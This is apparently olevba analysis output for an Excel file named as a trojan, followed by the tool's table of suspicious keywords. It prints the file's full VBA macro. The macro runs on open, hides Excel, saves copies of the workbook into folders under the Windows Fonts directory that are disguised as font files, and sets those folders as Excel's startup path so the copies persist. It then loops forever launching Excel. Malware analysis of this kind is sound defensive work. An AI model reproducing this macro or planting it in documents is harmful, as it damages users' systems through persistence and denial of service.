olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSExcel.V2.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Trojan.MSExcel.V2.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ëèñò1.cls 
in file: Trojan.MSExcel.V2.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ëèñò2.cls 
in file: Trojan.MSExcel.V2.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ëèñò3.cls 
in file: Trojan.MSExcel.V2.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ìîäóëü2.bas 
in file: Trojan.MSExcel.V2.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Модуль2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AUTO_OPEN()
   Application.Visible = False
   If ActiveWorkbook.Name = "V2.XLS" Then Q = 1
   e = Format(Now(), "h:mm:ss")
   E1 = (Hour(e) + 1) & (Minute(e) + 1) & (Second(e) + 1)
   b = "C:\WINDOWS\FONTS\a" & E1 & ".ttf"
   MkDir b
   ActiveWorkbook.SaveAs FileName:=b & "\ a" & E1 & ".   "
   MkDir b & "\" & E1
   ActiveWorkbook.SaveAs FileName:=b & "\" & E1 & "\ b" & (E1 + 1) & ".   "
   Application.AltStartupPath = b
 If Q = 1 Then
  Application.Quit
  Exit Sub
 End If
   Do
    Application.Workbooks.Open ("C:\Program Files\Microsoft Office\Office\excel.exe")
   Loop
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTO_OPEN           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Application.AltStart|May change which directory contains files to |
|          |upPath              |open at startup                              |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |excel.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

